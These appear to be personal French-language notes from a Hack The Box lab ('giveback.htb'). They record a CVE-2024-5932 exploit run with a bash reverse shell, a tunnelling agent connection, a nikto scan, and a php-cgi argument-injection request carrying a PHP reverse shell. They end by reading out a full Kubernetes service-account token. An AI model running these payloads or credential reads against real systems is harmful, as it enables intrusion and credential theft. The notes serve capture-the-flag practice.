


![[IMG-20260115182823570.png]]

```
python3 CVE-2024-5932-rce.py \
  -u http://giveback.htb/donations/the-things-we-need/ \
  -c "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.134/4444 0>&1'"
```


![[IMG-20260115190938163.png]]


![[IMG-20260115190900250.png]]

![[IMG-20260115194320820.png]]

Machine Cible:
```
./agent -connect 10.10.16.33:11601 -accept-fingerprint 64E58D21BCF29BC9CCDDF20562AEE96877EFF5D6A87AD37B75A03B118CBF0175
```

![[IMG-20260115194345293.png]]

Machine atttaquante:
![[IMG-20260115194433931.png]]
![[IMG-20260116030630630.png]]
![[IMG-20260116030316748.png]]

Variable environnement:
![[IMG-20260116030342781.png]]

```
LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
```

![[IMG-20260116030420077.png]]

On utilise nikto pour footprinter les siteweb:
![[IMG-20260118160714840.png]]

/cgi-bin/php-cgi
[HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/cgi.html#old-php--cgi--rce-cve-2012-1823-cve-2012-2311)


![[IMG-20260119004545787.png]]


```
POST /cgi-bin/php-cgi?-d+disable_functions=+-d+auto_prepend_file=php://input HTTP/1.1
Host: 10.43.2.241:5000
Content-Type: text/plain
Content-Length: 77


php -r '$sock=fsockopen("10.10.16.33",5555);shell_exec("sh <&3 >&3 2>&3");'
```


![[IMG-20260119004711181.png]]

```
cat /var/run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUzI1NiIsImtpZCI6Inp3THEyYUhkb19sV3VBcGFfdTBQa1c1S041TkNiRXpYRS11S0JqMlJYWjAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODAwMzY1MDAzLCJpYXQiOjE3Njg4MjkwMDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMTYzZGM2MzUtZDQ1My00ODU2LTgzOWMtNzRhNGJmODM2YzExIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZ2l2ZWJhY2suaHRiIiwidWlkIjoiMTJhOGE5Y2YtYzM1Yi00MWYzLWIzNWEtNDJjMjYyZTQzMDQ2In0sInBvZCI6eyJuYW1lIjoibGVnYWN5LWludHJhbmV0LWNtcy02ZjdiZjVkYjg0LXpjeDg4IiwidWlkIjoiNjEyYmJmZjMtOTQ3NS00ZGVmLTg2MjQtNTI1ODI4MzAwNDAzIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJzZWNyZXQtcmVhZGVyLXNhIiwidWlkIjoiNzJjM2YwYTUtOWIwOC00MzhhLWEzMDctYjYwODc0NjM1YTlhIn0sIndhcm5hZnRlciI6MTc2ODgzMjYxMH0sIm5iZiI6MTc2ODgyOTAwMywic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2VjcmV0LXJlYWRlci1zYSJ9.07TfOM5vP8sqLlVjkWNEV-OI34q139ExvhfrAEzEPjrEgZSGPGqx2RuonQCAEgFhMHYc5wTHMPPj9FB7pKEyb00IgB74fvu4J01cN-ZwMiiXQfrrJRcsaWgGTVGXkP9roiOwTzSW2wj_aaDII7WUIrniID8ZP5epBbauAy0XnxqxySm7Eq81I_6GvK3BPHZOzw0T5A1ipIM8SuOd3c7IWkCmkqplDBF5pd-OY9-048UsD78nYE4MDKgVjDi-zJQ0WzRm8JPfKdDHyRbh65rhEXfNs8BaA5ASkNzWAnsChafIgUNoKlhGX9xNFElznW6znpl3t22UvBd8D7TOSlyRrw
```

```
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT=tcp://10.43.0.1:443
```

![[IMG-20260119144347787.png]]

